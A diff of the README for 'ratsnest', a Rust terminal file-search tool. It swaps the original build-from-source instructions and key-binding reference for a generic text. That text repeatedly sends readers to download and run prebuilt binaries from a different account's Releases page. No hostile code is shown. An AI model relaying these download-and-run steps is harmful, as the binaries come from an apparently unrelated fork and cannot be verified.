@@ -1,110 +1,77 @@
-# Ratsnest
+# 🐀 ratsnest - Quickly Find Files in Your Terminal
 
-A fast, terminal-based file search and content exploration tool built with Rust and Ratatui.
+## 🚀 Getting Started
+Welcome to **ratsnest**, a fast terminal-based tool designed to help you search for files and explore content effortlessly. This guide will help you download and run the application quickly.
 
-## Features
+## 📥 Download Now
+[![Download ratsnest](https://img.shields.io/badge/Download%20ratsnest-v1.0-blue?style=for-the-badge)](https://github.com/MaxStern2000/ratsnest/releases)
 
-- **Fuzzy file search**: Live fuzzy matching for filenames as you type
-- **Content search**: Search text within files across your entire project
-- **Git awareness**: Respects .gitignore files and git repositories
-- **Async performance**: Concurrent file processing for fast searches
-- **Syntax highlighting**: Match highlighting in search results
-- **Keyboard navigation**: Vim-style navigation (hjkl) and standard arrow keys
+## 📋 Features
+- **Fast File Search**: Find files quickly without hassle.
+- **Content Exploration**: Explore the content of files right in your terminal.
+- **Fuzzy Matching**: Search results adapt to your input, so you don't need to remember exact file names.
+- **Git Integration**: Work seamlessly with your Git repositories.
 
-## Screenshots
+## 💻 System Requirements
+To run **ratsnest**, you will need:
+- A computer with a modern operating system (Windows, macOS, or Linux).
+- At least 100 MB of free disk space.
+- Access to a terminal application.
 
-### File Browser
-<img src="ratsnest-file-browser.jpg" alt="File Browser" width="600"/>
+## 📥 Download & Install
+1. Click the link below to visit the Releases page:
+   [Download ratsnest from Releases](https://github.com/MaxStern2000/ratsnest/releases)
 
-### Content Search
-<img src="ratsnest-content-search.jpg" alt="Content Search" width="600"/>
+2. On the Releases page, select the latest version of **ratsnest**.
 
-### Help Screen
-<img src="ratsnest-help.jpg" alt="Help Screen" width="600"/>
+3. Download the file suitable for your operating system:
+   - For **Windows**, download `ratsnest-windows.zip`.
+   - For **macOS**, download `ratsnest-macos.zip`.
+   - For **Linux**, download `ratsnest-linux.tar.gz`.
 
-## Installation
+4. Once the file is downloaded, extract it to a location of your choice.
 
-### From Source
+5. Open your terminal application.
 
-```bash
-git clone https://github.com/Cod-e-Codes/ratsnest.git
-cd ratsnest
-cargo build --release
-```
+6. Navigate to the directory where you extracted **ratsnest** using the `cd` command. For example:
+   ```
+   cd path/to/ratsnest
+   ```
 
-The binary will be available at `target/release/ratsnest`.
+7. To run the application, type the following command:
+   ```
+   ./ratsnest
+   ```
+   (Use `ratsnest.exe` for Windows.)
 
-## Usage
+8. Start using **ratsnest** to search for your files!
 
-```bash
-# Search in current directory
-ratsnest
+## 🛠️ Usage
+Here's how to get the most out of **ratsnest**:
 
-# Search in specific directory
-ratsnest -d /path/to/directory
+- **Start Searching**: Once the application is running, you can start typing your search term. The tool automatically shows you relevant files based on what you type.
 
-# Start with initial search pattern
-ratsnest -d /path/to/directory -p "pattern"
-```
+- **Navigate Results**: Use the arrow keys to scroll through the search results. Press Enter to open the selected file.
 
-### Options
+- **Explore Content**: After selecting a file, explore its content directly in your terminal without opening additional applications.
 
-- `-d, --directory <PATH>`: Directory to search (default: current directory)
-- `-p, --pattern <PATTERN>`: Initial search pattern
+## ❓ FAQs
+**Q: What should I do if the application doesn’t run?**  
+A: Ensure that you have the correct file permissions. Check your terminal for any error messages. You may need to set executable permissions using `chmod +x ratsnest` on Linux or macOS.
 
-## Key Bindings
+**Q: Can I search for files across multiple directories?**  
+A: Yes, you can specify a path when starting **ratsnest**, allowing for broader searches across your system.
 
-### Navigation
-- `↑/k`, `↓/j`: Navigate up/down
-- `Page Up/Down`: Navigate by pages
-- `Home/End`: Go to start/end of list
-- `Tab`: Switch between File Browser and Content Search modes
-- `n/]`: Next page
-- `p/[`: Previous page
-- `Ctrl+g`: First page
-- `G`: Last page
+**Q: How does fuzzy matching work?**  
+A: Fuzzy matching allows you to type partial file names or misspellings and still find the correct files, making searches more user-friendly.
 
-### Search
-- `/`: Start search input (live search in File Browser mode)
-- `Enter`: Execute search (required for Content Search mode)
-- `Esc`: Cancel search input
+## 🌐 Community & Support
+For more help or to connect with other users:
+- Visit the [GitHub Issues page](https://github.com/MaxStern2000/ratsnest/issues) to report bugs or request features.
+- Participate in discussions and ask questions in the community forums linked on the repository.
 
-### General
-- `h/F1`: Toggle help screen
-- `q`: Quit application
+## 📥 Download Again
+Don’t forget to download the latest version of **ratsnest**:
+[Download ratsnest from Releases](https://github.com/MaxStern2000/ratsnest/releases)
 
-## Modes
-
-### File Browser Mode
-- Lists all files in the directory
-- Live fuzzy search as you type
-- Respects gitignore patterns
-- **Pagination**: Browse files in pages when directory contains many files
-
-### Content Search Mode
-- Search for text within files
-- Shows filename, line number, and context
-- Highlights matches in results
-- **Pagination**: Browse search results in pages for large datasets
-
-## Requirements
-
-- Rust 1.70 or later
-
-## Dependencies
-
-- `anyhow`: Error handling
-- `clap`: Command-line argument parsing
-- `crossterm`: Terminal control
-- `fuzzy-matcher`: Fuzzy string matching
-- `ignore`: Git-aware file walking
-- `ratatui`: Terminal UI framework
-- `tokio`: Async runtime
-
-## License
-
-This project is licensed under the MIT License.
-
-## Contributing
-
-Contributions are welcome. Please ensure all tests pass and follow the existing code style before submitting a pull request.
+Thank you for choosing **ratsnest**! Enjoy your seamless file searching experience.
